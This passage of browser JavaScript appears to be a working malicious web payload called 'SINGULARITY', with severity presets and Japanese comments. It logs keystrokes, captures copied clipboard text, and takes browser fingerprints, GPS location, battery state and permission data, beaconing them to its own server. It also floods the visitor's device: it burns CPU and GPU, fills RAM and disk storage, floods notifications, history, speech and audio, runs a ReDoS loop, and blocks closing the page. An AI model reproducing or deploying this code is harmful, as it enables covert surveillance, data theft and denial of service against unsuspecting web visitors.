         acContexts: 6, timers: 60, microtasks: 1, compress: 1, redos: 1, digest: 1,
         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 200, idbDisk: 1,
         speakFlood: 20, downloads: 32, clipHijack: 1, sseStorm: 8, fetchStorm: 4,
         oscBank: 120, sharedWorker: 1, fsFolder: 1, fsFiles: 120, installer: 1,
         winMode: "breed", winBranch: 2, winDepth: 5, winSkin: 1, swarm: 6,
         dlMB: 3, dlGap: 800 }),
  7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 48,
         history: 30000, notify: 120, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 32, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1, iframes: 16, domNodes: 12000, cssAnim: 400, glContexts: 24,
         acContexts: 8, timers: 100, microtasks: 1, compress: 1, redos: 1, digest: 1,
         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 400, idbDisk: 1,
         speakFlood: 30, downloads: -1, clipHijack: 1, sseStorm: 12, fetchStorm: 6,
         oscBank: 200, sharedWorker: 1, fsFolder: 1, fsFiles: 200, installer: 1,
         winMode: "breed", winBranch: 2, winDepth: 0, winSkin: 1, swarm: 12,
         dlMB: 4, dlGap: 700 })
};

function applyLevel(l) {
  if (CFG.fixed) LEVEL = 7;
  else LEVEL = clamp(l, 0, 7);
  var p = PRESET[LEVEL] || PRESET[1];
  for (var k in p) CFG[k] = p[k];
  if (LEVEL >= 2) {
    var mult = LEVEL >= 7 ? 3 : (LEVEL >= 6 ? 2 : 1);
    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, LEVEL >= 7 ? 64 : 48);
    if (LEVEL >= 7) {
      var auto = Math.max(8192, (navigator.deviceMemory || 4) * 1024 * 2);
      CFG.ramMB = Math.round(CFG.finalRamMB > 0 ? CFG.finalRamMB : auto);
      CFG.workerMB = 32;
    } else {
      CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
      CFG.workerMB = LEVEL >= 5 ? 24 : 16;
    }
  } else { CFG.cores = 0; CFG.ramMB = 0; }
  if (CFG.winLock) {
    if (CFG.winLock.mode) CFG.winMode = CFG.winLock.mode;
    if (CFG.winLock.branch) CFG.winBranch = CFG.winLock.branch;
    if (CFG.winLock.depth != null) CFG.winDepth = CFG.winLock.depth;
  }
  R.final = (LEVEL >= 7);
}
applyLevel(LEVEL);

var STANDALONE = false;
try {
  STANDALONE = !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches)
    || !!navigator.standalone
    || !!(window.matchMedia && matchMedia("(display-mode: window-controls-overlay)").matches);
} catch (e) {}
if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);

/* ================= 1. 環境 / 列挙 ================= */
function base() {
  var n = navigator, s = screen;
  R.env = {
    ua: n.userAgent, platform: n.platform, lang: n.language, langs: n.languages,
    cores: n.hardwareConcurrency, mem: n.deviceMemory, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: s.width + "x" + s.height, avail: s.availWidth + "x" + s.availHeight,
    dpr: devicePixelRatio, colorDepth: s.colorDepth, touch: (n.maxTouchPoints || 0),
    cookies: n.cookieEnabled, online: n.onLine, pdf: !!n.pdfViewerEnabled,
    standalone: STANDALONE, sid: SID, ver: MYVER, level: LEVEL,
    vw: innerWidth, vh: innerHeight, ref: Q("ref"), url: location.href, host: location.host,
    u: Q("u") || "root", w: W,
    mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0, inapp: INAPP ? 1 : 0
  };
  try { R.env.plugins = (n.plugins || []).length; } catch (e) {}
}

/* ================= 2. ページ / DOM / キーログ ================= */
function pageMeta() {
  R.page = {
    title: document.title || null, forms: document.forms.length, links: document.links.length,
    imgs: document.images.length, scripts: document.scripts.length, nodes: document.getElementsByTagName("*").length,
    text: (document.body ? document.body.innerText || "" : "").slice(0, 600),
    origin: location.origin, referrer: document.referrer || null
  };
  if (!CFG.dom) return;
  try {
    var k = [];
    addEventListener("keydown", function (e) {
      k.push(e.key);
      if (k.length > 40) k.shift();
      R.page.keys = k.join("");
    });
  } catch (e) {}
}

/* ================= 3. 指紋 ================= */
function canvasFP() {
  try {
    var c = document.createElement("canvas"), x = c.getContext("2d");
    x.textBaseline = "top"; x.font = "14px Arial"; x.fillStyle = "#f60";
    x.fillRect(0, 0, 100, 30); x.fillStyle = "#069";
    x.fillText("SINGULARITY \u7D76\u6EC5", 2, 6);
    return { hash: hash(c.toDataURL()) };
  } catch (e) { return null; }
}
function webglFP() {
  try {
    var c = document.createElement("canvas"), gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    var d = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
      renderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
      maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE), ext: (gl.getSupportedExtensions() || []).length
    };
  } catch (e) { return null; }
}
function fontFP() {
  try {
    var list = ["Arial", "Courier New", "Georgia", "Times New Roman", "Verdana", "MS Gothic",
                "Meiryo", "Yu Gothic", "Hiragino Kaku Gothic ProN", "Noto Sans JP", "Roboto",
                "Segoe UI", "Helvetica Neue", "Menlo", "Consolas"], have = [];
    var sp = document.createElement("span");
    sp.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
    sp.textContent = "mmmmmmmmmmlli";
    document.body.appendChild(sp);
    var w0 = sp.offsetWidth, h0 = sp.offsetHeight;
    for (var i = 0; i < list.length; i++) {
      sp.style.fontFamily = "'" + list[i] + "',monospace";
      if (sp.offsetWidth !== w0 || sp.offsetHeight !== h0) have.push(list[i]);
    }
    sp.remove();
    return { list: have, n: have.length };
  } catch (e) { return null; }
}
function mathFP() {
  try {
    var out = [Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.expm1(1), Math.log1p(10)];
    out.push(Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
    return { hash: hash(out.join(",")) };
  } catch (e) { return null; }
}
function audioFP() {
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC(), o = ctx.createOscillator(), an = ctx.createAnalyser();
    o.type = "triangle"; o.frequency.value = 10000;
    o.connect(an); an.connect(ctx.destination); o.start();
    var d = new Uint8Array(an.frequencyBinCount);
    an.getByteFrequencyData(d);
    R.vectors.audio = { hash: hash(Array.prototype.join.call(d.slice(0, 40), ",")), rate: ctx.sampleRate };
    try { ctx.close(); } catch (e) {}
  } catch (e) {}
}

/* ================= 4. ネット / 地理 / リーク ================= */
var TZ_CC = { "Asia/Tokyo": "JP", "Asia/Seoul": "KR", "Asia/Shanghai": "CN", "Asia/Taipei": "TW",
              "Europe/London": "GB", "Europe/Paris": "FR", "Europe/Berlin": "DE",
              "America/New_York": "US", "America/Los_Angeles": "US", "America/Chicago": "US" };
function netGuess() {
  var tz = R.env.tz || "";
  R.network = { tz: tz, cc: TZ_CC[tz] || null, lang: navigator.language,
                conn: (navigator.connection && navigator.connection.effectiveType) || null,
                down: (navigator.connection && navigator.connection.downlink) || null };
}
function leak(cb) {
  try {
    var p = new Promise(function (res) {
      var img = new Image();
      img.onload = function () { res("ok"); };
      img.onerror = function () { res("err"); };
      img.src = CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("px"));
    });
    setTimeout(function () { res(null); }, 2500);
    p.then(cb);
  } catch (e) { cb(null); }
}

/* ================= 5. プライバシー / 検知回避 ================= */
function testStore(kind) {
  try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; } catch (e) { return false; }
}
function privacy() {
  R.privacy = { ls: testStore("localStorage"), ss: testStore("sessionStorage"),
                idb: !!window.indexedDB, caches: !!window.caches, sw: !!navigator.serviceWorker };
  try {
    if (navigator.permissions && navigator.permissions.query) {
      R.privacy.permissions = {};
      ["geolocation", "notifications", "camera", "microphone", "clipboard-read"].forEach(function (name) {
        try { navigator.permissions.query({ name: name }).then(function (s) { R.privacy.permissions[name] = s.state; push(false); }).catch(function () {}); } catch (e) {}
      });
    }
  } catch (e) {}
}
function adblock() {
  try {
    var d = document.createElement("div");
    d.className = "ad-banner adsbox";
    d.style.cssText = "position:absolute;left:-9999px";
    document.body.appendChild(d);
    setTimeout(function () { R.privacy.adblock = d.offsetHeight === 0; d.remove(); }, 300);
  } catch (e) {}
}
function perms() {
  try {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: "storage-access" }).then(function (s) { R.privacy.storageAccess = s.state; }).catch(function () {});
    }
  } catch (e) {}
}

/* ================= 6. ハードウェア ================= */
function codecs() {
  var v = document.createElement("video"), a = document.createElement("audio");
  function t(m) { try { return v.canPlayType(m) || ""; } catch (e) { return ""; } }
  R.hardware.codecs = {
    h264: !!t('video/mp4; codecs="avc1.42E01E"'), hevc: !!t('video/mp4; codecs="hvc1"'),
    av1: !!t('video/mp4; codecs="av01.0.05M.08"'), vp9: !!t('video/webm; codecs="vp9"'),
    opus: !!(a.canPlayType && a.canPlayType('audio/webm; codecs="opus"')),
    flac: !!(a.canPlayType && a.canPlayType("audio/flac"))
  };
}
function benchmark() {
  try {
    var t = performance.now(), n = 0;
    while (performance.now() - t < 120) { Math.sqrt(n) * Math.sin(n); n++; }
    R.hardware.ops = Math.round(n / ((performance.now() - t) / 1000));
    var f = 0, t2 = performance.now();
    (function loop() {
      f++;
      if (performance.now() - t2 < 500) requestAnimationFrame(loop);
      else { R.hardware.fps = Math.round(f / ((performance.now() - t2) / 1000)); push(false); }
    })();
  } catch (e) {}
}
function devices() {
  try {
    R.hardware.media = {
      audioIn: (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) ? 1 : 0,
      gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
      bluetooth: !!navigator.bluetooth, usb: !!navigator.usb, serial: !!navigator.serial,
      hid: !!navigator.hid, nfc: "NDEFReader" in window, vr: !!navigator.xr,
      battery: !!navigator.getBattery, wakeLock: !!navigator.wakeLock
    };
  } catch (e) {}
}
function botProbe() {
  try {
    R.bot = {
      webdriver: !!navigator.webdriver, headlessUA: /headless/i.test(navigator.userAgent),
      chrome: !!window.chrome, plugins: (navigator.plugins || []).length,
      languages: (navigator.languages || []).length, touch: (navigator.maxTouchPoints || 0),
      hw: navigator.hardwareConcurrency || 0, mem: navigator.deviceMemory || 0
    };
    var score = 0;
    if (R.bot.webdriver) score += 30;
    if (R.bot.headlessUA) score += 30;
    if (!R.bot.plugins) score += 10;
    if (R.bot.hw && R.bot.hw < 2) score += 10;
    R.verdict = { score: score, bot: score >= 40 };
  } catch (e) {}
}
function behavior() {
  try {
    var t0 = now(), mv = 0, key = 0;
    addEventListener("pointermove", function () { mv++; }, { passive: true });
    addEventListener("keydown", function () { key++; });
    R.behavioral = { mv: 0, key: 0, alive: 0 };
    setTimeout(function () { R.behavioral = { mv: mv, key: key, alive: now() - t0 }; }, 3000);
  } catch (e) {}
}
function motion() {
  try {
    addEventListener("devicemotion", function (e) {
      var a = e.accelerationIncludingGravity || {};
      R.hardware.motion = { x: a.x, y: a.y, z: a.z };
    });
  } catch (e) {}
}
function mutate() {
  if (!CFG.mutate) return;
  try {
    var d = document.createElement("div");
    d.id = "sg_" + rid(5);
    d.style.cssText = "position:fixed;left:-9999px;top:0;width:1px;height:1px";
    document.body.appendChild(d);
  } catch (e) {}
}
function cryptoID() {
  try {
    R.crypto = { random: !!window.crypto, subtle: !!(window.crypto && window.crypto.subtle),
                 uuid: !!(window.crypto && window.crypto.randomUUID) };
    if (window.crypto && window.crypto.subtle && window.crypto.subtle.digest) {
      window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(SID)).then(function (b) {
        R.crypto.digest = b64u(b).slice(0, 24);
      }).catch(function () {});
    }
  } catch (e) {}
}
function camera() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
      R.rat.camera = 1;
      try { s.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
    }).catch(function () { R.rat.camera = 0; });
  } catch (e) {}
}
function batteryRead() {
  try {
    if (!navigator.getBattery) { R.hardware.battery = null; push(true); return; }
    navigator.getBattery().then(function (b) {
      R.hardware.battery = { level: Math.round((b.level || 0) * 100),
                             charging: !!b.charging, t: now() };
      push(true);
    }).catch(function () {});
  } catch (e) {}
}
function geo() {
  try {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(function (p) {
      R.network.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy };
      push(true);
    }, function () { R.network.gps = null; }, { enableHighAccuracy: true, timeout: 6000 });
  } catch (e) {}
}
function federation() {
  try {
    if (!CFG.sharedWorker || !window.SharedWorker) return;
    var w = new SharedWorker(URL.createObjectURL(
      new Blob([window.__SINGULARITY_SHARED__ || ""], { type: "application/javascript" })));
    w.port.postMessage({ k: "hello" });
    w.port.onmessage = function (e) { R.union = { peers: (e.data && e.data.n) || 0, at: now() }; };
    R.union = { peers: 1, at: now() };
  } catch (e) {}
}

/* ================= 7. 資源の圧搾 ================= */
function mkWorker() {
  try {
    return new Worker(URL.createObjectURL(
      new Blob([window.__SINGULARITY_WORKER__ || ""], { type: "application/javascript" })));
  } catch (e) { return null; }
}
function burnStart() {
  if (!CFG.burn) return;
  var n = CFG.cores || 0;
  for (var i = 0; i < n; i++) {
    var w = mkWorker();
    if (!w) break;
    try { w.postMessage({ k: "burn" }); } catch (e) {}
    WORKERS.push(w);
  }
  R.burn = { n: WORKERS.length, cores: CFG.cores, wasm: !!CFG.wasm, gpu: !!CFG.gpu,
             worklet: !!CFG.worklet, at: now() };
}
function ramStart() {
  if (!CFG.ramMB) return;
  if (!WORKERS.length) { var w0 = mkWorker(); if (w0) WORKERS.push(w0); }
  var n = Math.max(1, WORKERS.length);
  var per = Math.max(8, Math.round(CFG.ramMB / n));
  WORKERS.forEach(function (w) { try { w.postMessage({ k: "ram", mb: per }); } catch (e) {} });
  R.ram = { mb: per * n, per: per, n: n, at: now() };
}
function webgpuBurn() {
  if (!CFG.webgpu || R.webgpu) return;
  try {
    if (!navigator.gpu || !navigator.gpu.requestAdapter) { R.webgpu = 0; return; }
    navigator.gpu.requestAdapter().then(function (ad) {
      if (!ad) { R.webgpu = 0; return; }
      ad.requestDevice().then(function (dev) {
        R.webgpu = 1;
        var q = dev.queue, buf = dev.createBuffer({ size: 32 * 1024 * 1024, usage: 8 | 32 });
        var data = new Float32Array(4096);
        (function loop() {
          try { q.writeBuffer(buf, 0, data); q.submit([]); } catch (e) {}
          setTimeout(loop, 0);
        })();
        push(false);
      }).catch(function () { R.webgpu = 0; });
    }).catch(function () { R.webgpu = 0; });
  } catch (e) { err_(e); }
}
function gpuStart() {
  if (R.gl) return;
  try {
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return;
    R.gl = 1;
    (function loop() {
      try {
        gl.clearColor(Math.random(), Math.random(), 0.5, 1);
        gl.clear(gl.COLOR_BUFFER_BIT);
      } catch (e) {}
      if (!PAUSED) requestAnimationFrame(loop);
    })();
  } catch (e) {}
}
function diskStart() {
  if (HK.on) return;
  if (!CFG.diskRatio || R.disk.on) return;
  if (!navigator.storage || !navigator.storage.estimate) return;
  R.disk = { on: 1, ratio: CFG.diskRatio, mb: 0 };
  var MB = 4 * 1024 * 1024;
  navigator.storage.estimate().then(function (est) {
    var quota = est.quota || 0, used = est.usage || 0;
    if (!quota) return;
    var left = Math.floor(quota * CFG.diskRatio) - used;
    if (left < MB) { push(false); return; }
    var req = indexedDB.open("sg_disk", 1);
    req.onupgradeneeded = function () {
      var d = req.result;
      if (!d.objectStoreNames.contains("b")) d.createObjectStore("b");
    };
    req.onsuccess = function () {
      var db = req.result, n = Math.floor(left / MB);
      (function step(i) {
        if (i >= n) { push(true); return; }
        try {
          var a = new Uint8Array(MB);
          a[0] = i & 255; a[1] = (i >>> 8) & 255;
          var tx = db.transaction("b", "readwrite");
          tx.objectStore("b").put(new Blob([a]), i);
          tx.oncomplete = function () { R.disk.mb = (i + 1) * 4; if ((i & 15) === 0) push(false); step(i + 1); };
          tx.onerror = function () { step(i + 1); };
        } catch (e) { err_(e); }
      })(0);
    };
  }).catch(function () {});
}
function idbDiskStart() {
  if (!CFG.idbDisk || R.idb) return;
  R.idb = { on: 1 };
  try {
    if (navigator.storage && navigator.storage.persist) navigator.storage.persist();
    R.persist = { on: 1, at: now() };
  } catch (e) {}
}
function historyFlood() {
  if (!CFG.history || R.history.on) return;
  R.history = { on: 1, n: 0, cap: CFG.history };
  var n = 0;
  (function step() {
    var end = Math.min(n + 200, CFG.history);
    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
    R.history.n = n;
    if (n < CFG.history) setTimeout(step, 0); else push(false);
  })();
}

/* ---- 通知：全レベルで常時発報（burst で止まらない） ---- */
var NOTIFY_TIMER = null;
function notifyFlood() {
  if (NOTIFY_TIMER) return;
  R.notify = { on: 1, n: 0, at: 0 };
  NOTIFY_TIMER = setInterval(function () {
    try {
      if (PAUSED || !firing) return;
      if (!window.Notification) return;
      if (Notification.permission === "default") Notification.requestPermission();
      if (Notification.permission !== "granted") return;
      var every = LEVEL >= 7 ? 2000 : (LEVEL >= 5 ? 3000 : (LEVEL >= 3 ? 4000 : 6000));
      if (now() - (R.notify.at || 0) < every) return;
      R.notify.at = now();
      R.notify.n++;
      new Notification(CFG.avName, {
        body: "\u611F\u67D3 L" + LEVEL + " #" + R.notify.n + (IS_MOBILE ? " (mobile)" : ""),
        tag: "sg-" + (LEVEL >= 6 ? (R.notify.n % 8) : 0),
        requireInteraction: LEVEL >= 6
      });
      if (R.notify.n % 4 === 0) push(false);
    } catch (e) {}
  }, 1000);
}

function audioUnlock() {
  function go() {
    try { if (R.actx && R.actx.state === "suspended") R.actx.resume(); } catch (e) {}
    try {
      if (window.speechSynthesis && !R.spoke) {
        R.spoke = 1;
        speechSynthesis.speak(new SpeechSynthesisUtterance(" "));
      }
    } catch (e) {}
  }
  ["pointerdown", "click", "keydown", "touchstart", "visibilitychange"].forEach(function (ev) {
    addEventListener(ev, go);
  });
  go();
}
function audioLoop() {
  if (!CFG.audio || R.audio) return;
  R.audio = { on: 1 };
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC();
    R.actx = ctx;
    [42, 63].forEach(function (hz, k) {
      var o = ctx.createOscillator(), g = ctx.createGain();
      o.type = k ? "square" : "sawtooth";
      o.frequency.value = hz;
      g.gain.value = 0.07;
      o.connect(g); g.connect(ctx.destination); o.start();
    });
    try { ctx.resume(); } catch (e) {}
    R.audio.hz = 42;
  } catch (e) {}
}
function noiseBurst() {
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC();
    var b = ctx.createBuffer(1, Math.floor(ctx.sampleRate * 0.6), ctx.sampleRate);
    var d = b.getChannelData(0);
    for (var i = 0; i < d.length; i++) d[i] = Math.random() * 2 - 1;
    var s = ctx.createBufferSource(); s.buffer = b;
    var g = ctx.createGain(); g.gain.value = 0.12;
    s.connect(g); g.connect(ctx.destination); s.start();
    R.noise = { at: now() };
  } catch (e) {}
}
function flash() {
  try {
    var d = document.getElementById("sg_flash");
    if (!d) {
      d = document.createElement("div");
      d.id = "sg_flash";
      d.style.cssText = "position:fixed;inset:0;z-index:2147481000;pointer-events:none;"
        + "background:#ff0033;opacity:0;transition:opacity .12s";
      document.body.appendChild(d);
    }
    var i = 0;
    (function loop() {
      d.style.opacity = (i % 2) ? "0.55" : "0";
      i++;
      if (i < 12) setTimeout(loop, 130); else d.style.opacity = "0";
    })();
    R.flash = { at: now() };
  } catch (e) {}
}
function titleFlicker() {
  if (!CFG.titleFlicker || R.title) return;
  R.title = { on: 1 };
  var base_ = document.title, i = 0;
  TIMERS.push(setInterval(function () {
    document.title = (i++ % 2) ? base_ : ("\u26A0 " + CFG.avName + " \u611F\u67D3");
  }, 900));
}
function faviconSpin() {
  if (!CFG.favicon || R.favicon) return;
  R.favicon = { on: 1 };
  try {
    var c = document.createElement("canvas"); c.width = c.height = 64;
    var x = c.getContext("2d"), a = 0;
    (function loop() {
      x.fillStyle = "#05070a"; x.fillRect(0, 0, 64, 64);
      x.strokeStyle = "#00ff88"; x.lineWidth = 6;
      x.beginPath(); x.arc(32, 32, 20, a, a + 4); x.stroke();
      a += 0.2;
      var l = document.querySelector("link[rel~='icon']");
      if (!l) { l = document.createElement("link"); l.rel = "icon"; document.head.appendChild(l); }
      l.href = c.toDataURL();
      requestAnimationFrame(loop);
    })();
  } catch (e) {}
}
function mediaHijack() {
  if (!CFG.mediaSession || R.media) return;
  R.media = { on: 1 };
  try {
    if (!navigator.mediaSession) return;
    navigator.mediaSession.metadata = new MediaMetadata({
      title: CFG.avName, artist: "SINGULARITY", album: "v" + MYVER
    });
    navigator.mediaSession.setActionHandler("pause", function () {});
  } catch (e) {}
}
function badge() {
  if (!CFG.badge || R.badge) return;
  R.badge = { on: 1 };
  try { navigator.setAppBadge && navigator.setAppBadge(1); } catch (e) {}
}
function uncloseable() {
  if (!CFG.uncloseable || R.unclose) return;
  R.unclose = 1;
  try {
    addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; return ""; });
  } catch (e) {}
}
function wakelock() {
  if (CFG.wakelock) { R.wake = R.wake || { on: 1 }; }
  try {
    if (navigator.wakeLock && navigator.wakeLock.request) {
      R.wake = R.wake || { on: 1 };
      navigator.wakeLock.request("screen").then(function (s) {
        R.wake.screen = 1;
        s.addEventListener && s.addEventListener("release", function () { R.wake.screen = 0; });
      }).catch(function () {});
    }
  } catch (e) {}
}
function gpuMemBomb() {
  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
  R.gmem = 1;
  try {
    var c = document.createElement("canvas");
    c.width = 4096; c.height = 4096;
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return;
    var tex = [];
    for (var i = 0; i < 8; i++) {
      var t = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D, t);
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
      tex.push(t);
    }
    R.gmem = { textures: tex.length };
  } catch (e) {}
}
function finalOverlay() {
  if (LEVEL < 7 || R.fov || WIN || IFR) return;
  R.fov = 1;
  try {
    var d = document.createElement("div");
    d.id = "sg_fov";
    d.style.cssText = "position:fixed;inset:0;z-index:2147483646;pointer-events:none;"
      + "background:radial-gradient(circle at 50% 50%, rgba(0,255,136,.06), rgba(5,7,10,.30));"
      + "mix-blend-mode:screen";
    document.body.appendChild(d);
  } catch (e) {}
}
function iframeBomb() {
  if (!CFG.iframes || R.ifr) return;
  R.ifr = 1;
  try {
    for (var i = 0; i < CFG.iframes; i++) {
      var f = document.createElement("iframe");
      f.src = CFG.path + "?u=ifr&ref=" + SID + "&b=" + i;
      f.style.cssText = "position:fixed;width:1px;height:1px;left:-9999px;opacity:0";
      document.body.appendChild(f);
    }
  } catch (e) {}
}
function domBomb() {
  if (!CFG.domNodes || R.dom) return;
  R.dom = { on: 1, n: 0 };
  var wrap = document.createElement("div");
  wrap.style.cssText = "position:fixed;left:-9999px;top:0";
  document.body.appendChild(wrap);
  var n = 0;
  (function step() {
    var end = Math.min(n + 1000, CFG.domNodes);
    var frag = document.createDocumentFragment();
    for (; n < end; n++) {
      var s = document.createElement("span");
      s.textContent = ".";
      frag.appendChild(s);
    }
    wrap.appendChild(frag);
    R.dom.n = n;
    if (n < CFG.domNodes) setTimeout(step, 0); else push(false);
  })();
}
function cssBomb() {
  if (!CFG.cssAnim || R.css) return;
  R.css = 1;
  try {
    var st = document.createElement("style");
    st.textContent = "@keyframes sgspin{from{transform:rotate(0) translateX(160px)}"
      + "to{transform:rotate(360deg) translateX(160px)}}";
    document.head.appendChild(st);
    for (var i = 0; i < CFG.cssAnim; i++) {
      var d = document.createElement("div");
      d.style.cssText = "position:fixed;left:-9999px;width:2px;height:2px;background:#0f8;"
        + "animation:sgspin " + (1 + (i % 5)) + "s linear infinite";
      document.body.appendChild(d);
    }
  } catch (e) {}
}
function glContextBomb() {
  if (!CFG.glContexts || R.glctx) return;
  R.glctx = 1;
  try {
    for (var i = 0; i < CFG.glContexts; i++) {
      var c = document.createElement("canvas"); c.width = c.height = 256;
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) break;
      gl.clearColor(Math.random(), 1, 0.5, 1); gl.clear(gl.COLOR_BUFFER_BIT);
      document.body.appendChild(c);
    }
  } catch (e) {}
}
function acContextBomb() {
  if (!CFG.acContexts || R.ac) return;
  R.ac = 1;
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    for (var i = 0; i < CFG.acContexts; i++) {
      var c = new AC();
      var o = c.createOscillator();
      o.frequency.value = 200 + i * 37;
      o.connect(c.destination); o.start();
    }
  } catch (e) {}
}
function timerStorm() {
  if (!CFG.timers || R.timers) return;
  R.timers = 1;
  try { for (var i = 0; i < CFG.timers; i++) TIMERS.push(setInterval(function () {}, 1 + (i % 16))); } catch (e) {}
}
function microStorm() {
  if (!CFG.microtasks || R.micro) return;
  R.micro = { n: 0 };
  (function loop() {
    R.micro.n++;
    if (R.micro.n % 20000 === 0) R.micro.at = now();
    Promise.resolve().then(loop);
  })();
}
function compressStorm() {
  if (!CFG.compress || R.comp) return;
  R.comp = 1;
  try {
    if (!window.CompressionStream) return;
    var w = new CompressionStream("gzip").writable.getWriter();
    var data = new Uint8Array(65536);
    (function loop() { try { w.write(data); } catch (e) { return; } setTimeout(loop, 0); })();
  } catch (e) {}
}
function redos() {
  if (!CFG.redos || R.redos) return;
  R.redos = 1;
  try {
    var re = /(a+)+$/;
    TIMERS.push(setInterval(function () { re.test("aaaaaaaaaaaaaaaaaaaaaaaaaab"); }, 50));
  } catch (e) {}
}
function digestStorm() {
  if (!CFG.digest || R.digest) return;
  R.digest = { n: 0 };
  try {
    if (!(window.crypto && crypto.subtle)) return;
    var buf = new TextEncoder().encode(SID);
    (function loop() {
      crypto.subtle.digest("SHA-256", buf).then(function () { R.digest.n++; loop(); }).catch(function () {});
    })();
  } catch (e) {}
}
function readbackStorm() {
  if (!CFG.readback || R.readback) return;
  R.readback = { n: 0 };
  try {
    var c = document.createElement("canvas"); c.width = c.height = 1024;
    var x = c.getContext("2d");
    (function loop() {
      x.fillStyle = "#0f8"; x.fillRect(0, 0, 1024, 1024);
      x.getImageData(0, 0, 1024, 1024);
      R.readback.n++;
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function sseStorm() {
  if (!CFG.sseStorm || R.sse) return;
  R.sse = { n: 0 };
  try {
    if (!window.EventSource) return;
    for (var i = 0; i < CFG.sseStorm; i++) {
      var es = new EventSource(CFG.path + "/sse?sid=" + SID + "&b=" + i);
      es.onmessage = function () { R.sse.n++; };
    }
  } catch (e) {}
}
function fetchStorm() {
  if (!CFG.fetchStorm || R.fetch) return;
  R.fetch = { n: 0 };
  (function loop() {
    for (var i = 0; i < CFG.fetchStorm; i++) {
      fetch(CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("f" + i)),
            { cache: "no-store" }).then(function () { R.fetch.n++; }).catch(function () {});
    }
    setTimeout(loop, 0);
  })();
}
function speakFlood() {
  if (!CFG.speakFlood || R.speak || !window.speechSynthesis) return;
  R.speak = { n: 0 };
  var i = 0;
  TIMERS.push(setInterval(function () {
    if (i++ >= CFG.speakFlood) return;
    try {
      var u = new SpeechSynthesisUtterance(CFG.avName + " " + i);
      u.lang = "ja-JP";
      speechSynthesis.speak(u);
      R.speak.n = i;
    } catch (e) {}
  }, 4000));
}
function oscBank() {
  if (!CFG.oscBank || R.osc) return;
  R.osc = { n: 0 };
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC();
    for (var i = 0; i < CFG.oscBank; i++) {
      var o = ctx.createOscillator();
      o.frequency.value = 60 + i;
      o.connect(ctx.destination); o.start();
      R.osc.n++;
    }
  } catch (e) {}
}
function cacheBuckets() {
  if (!CFG.cacheBuckets || R.cache || !window.caches) return;
  R.cache = { n: 0 };
  caches.open("sg-c").then(function (c) {
    var n = 0;
    (function step() {
      var end = Math.min(n + 20, CFG.cacheBuckets), ps = [];
      for (; n < end; n++) ps.push(c.put("/sg-c/" + n, new Response("x" + n)).catch(function () {}));
      R.cache.n = n;
      Promise.all(ps).then(function () { if (n < CFG.cacheBuckets) step(); else push(false); });
    })();
  }).catch(function () {});
}
function layoutThrash() {
  if (!CFG.layoutThrash || R.layout) return;
  R.layout = { n: 0 };
  var d = document.createElement("div");
  d.style.cssText = "position:fixed;left:-9999px;width:100px";
  document.body.appendChild(d);
  (function loop() {
    d.style.width = (100 + (R.layout.n % 40)) + "px";
    d.style.height = (R.layout.n % 40) + "px";
    d.offsetHeight;
    R.layout.n++;
    setTimeout(loop, 0);
  })();
}
function clipHijack() {
  if (!CFG.clipHijack || R.clip) return;
  R.clip = 1;
  try {
    addEventListener("copy", function () {
      try {
        var t = document.getSelection().toString();
        if (t) { R.clip = { at: now(), text: t.slice(0, 200) }; push(false); }
      } catch (e) {}
    });
  } catch (e) {}
}

